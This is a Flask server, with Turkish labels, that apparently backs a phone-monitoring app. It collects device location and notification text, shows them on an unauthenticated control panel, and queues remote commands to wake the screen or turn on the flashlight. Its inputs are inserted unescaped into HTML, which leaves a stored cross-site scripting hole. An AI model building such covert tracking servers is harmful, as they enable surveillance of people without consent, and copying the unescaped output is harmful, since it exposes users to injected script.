from flask import Flask, request

app = Flask(__name__)

# Cihazları ID'lerine göre tutuyoruz
devices = {}

@app.route('/update', methods=['POST'])
def update():
    device_id = request.form.get('device_id', 'Bilinmeyen_Cihaz')
    
    if device_id not in devices:
        devices[device_id] = {"konum": "Bekleniyor...", "bildirim": "Yok...", "komut": "0"}
    
    if 'lat' in request.form:
        devices[device_id]["konum"] = request.form.get('lat')
    if 'bildirim' in request.form:
        devices[device_id]["bildirim"] = request.form.get('bildirim')
        
    return "OK", 200

@app.route('/get-command', methods=['GET'])
def get_command():
    device_id = request.args.get('device_id')
    if device_id in devices:
        cmd = devices[device_id]["komut"]
        if cmd != "0":
            devices[device_id]["komut"] = "0"
        return cmd
    return "0"

@app.route('/set-command', methods=['POST'])
def set_command():
    device_id = request.form.get('device_id')
    cmd = request.form.get('cmd')
    if device_id in devices and cmd in ["0", "1", "2"]:
        devices[device_id]["komut"] = cmd
    return f"Komut {cmd} cihaz {device_id} için ayarlandı. <a href='/get-status'>Geri Dön</a>"

@app.route('/get-status', methods=['GET'])
def get_status():
    html = "<html><head><meta charset='UTF-8'><title>Zewnd Kontrol Paneli</title></head><body style='font-family:sans-serif; padding:20px;'>"
    html += f"<h1>Bağlı Cihaz Sayısı: {len(devices)}</h1>"
    
    for d_id, info in devices.items():
        html += f"""
        <div style="border:1px solid #ccc; padding:15px; margin-bottom:15px; border-radius:8px;">
            <h3>Cihaz ID: {d_id}</h3>
            <p>📍 Konum: {info['konum']}</p>
            <p>🔔 Bildirim: {info['bildirim']}</p>
            <form action="/set-command" method="POST">
                <input type="hidden" name="device_id" value="{d_id}">
                <button name="cmd" value="1" style="padding:10px;">Ekranı Uyandır</button>
                <button name="cmd" value="2" style="padding:10px;">Feneri Aç</button>
            </form>
        </div>
        """
    html += "</body></html>"
    return html

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
